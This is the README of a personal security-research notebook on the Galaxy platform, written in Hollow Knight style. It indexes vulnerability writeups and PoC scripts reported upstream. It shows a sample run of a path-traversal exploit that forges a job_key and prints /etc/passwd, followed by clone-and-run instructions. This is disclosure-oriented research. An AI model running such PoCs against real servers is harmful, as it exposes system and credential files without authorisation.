# hallownest-galaxy

A personal notebook from poking around the Galaxy codebase.

I maintain Galaxy deployments at work and got curious about how the
platform holds together under the hood. 

Some findings reported upstream, some fixed, some still sitting there.

Independent research, just exploring.

---

A good expedition does not always end with a slain god or a shattered seal.

Some days, the Knight simply maps a forgotten boundary deeper than before.
Some days, a dangerous assumption is uncovered beneath the dust.
Some days, a single line is carved into the lore tablets for those who wander later.
And sometimes, hidden in the dark between them all, a new path opens.

---

## How to play

Hallownest is a dead kingdom. You explore it alone, with no map given upfront.

The Knight carries a nail and nothing else. You read what's carved on the walls, you fight what lives in the dark, and you write down what you find.

Not every breach begins with a new vulnerability. Sometimes the kingdom simply leaves its gates unguarded long enough for old flaws to become exploitable.

**`journals/`** — The Hunter's Journal. One entry per finding: what it is, how it works, what it proves. Full writeups with PoC and impact.

**`lore/`** — Lore tablets. Atomic knowledge carved into stone. Vulnerability classes, mental models, patterns worth remembering across engagements.

**`spells/`** — Spells. One end-to-end PoC script per journal entry. Load the `.env`, run the spell, watch it land.

**To cast a spell: `./cast.sh spells/<spell>.py`**

```
./cast.sh spells/HG-2026-001-path-traversal-default-id-secret.py 
[*] Copying HG-2026-001-path-traversal-default-id-secret.py -> /galaxy/scripts/
[*] Activating venv (/galaxy/.venv)
[*] Casting...
[*] Creating history...
[*] History: 74c2add003416219
[*] Finding tool with dataset input...
[*] Tool: tomato_k8s_remote  input param: input1
[*] Uploading dataset...
[*] Dataset: 5c1a0943843ffb61
[*] Running tomato_k8s_remote...
[*] Job enc: 2fdaa50596da64b0  int: 103
[*] job_key: 9dfea76ad6709b23

[*] Reading /etc/passwd...
[*] Status: 200

==================================================
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
[...]
```

To run a spell:
```
git clone https://github.com/martincarrere/hallownest-galaxy
cd hallownest-galaxy
# fill in .env, then cast:
./cast.sh spells/<spell>.py
```


A spell draws on what is already rooted here. `cast.sh` carries it down into Galaxy's `scripts/` and stirs the venv to life. The full kingdom does not follow the Knight. Galaxy's own libraries stay buried where they were planted, and this notebook stays light.
---

## Journal

Some entries are wounds. Some are just the architecture. Both go in the journal.


| ID | Title | CWE | Severity | Reported | Status |
|---|---|---|---|---|---|
| [HG-2026-001](journals/HG-2026-001-path-traversal-default-id-secret.md) | Arbitrary file read via path traversal and forgeable job_key | 22, 1188 | High | 2026-03-06| Reported |
| [HG-2026-002](journals/HG-2026-002-zip-sticky-bit.md) | Zip archive-to-directory converter preserves SUID/sticky bit | 732 | Medium | 2026-05-23 | Reported |

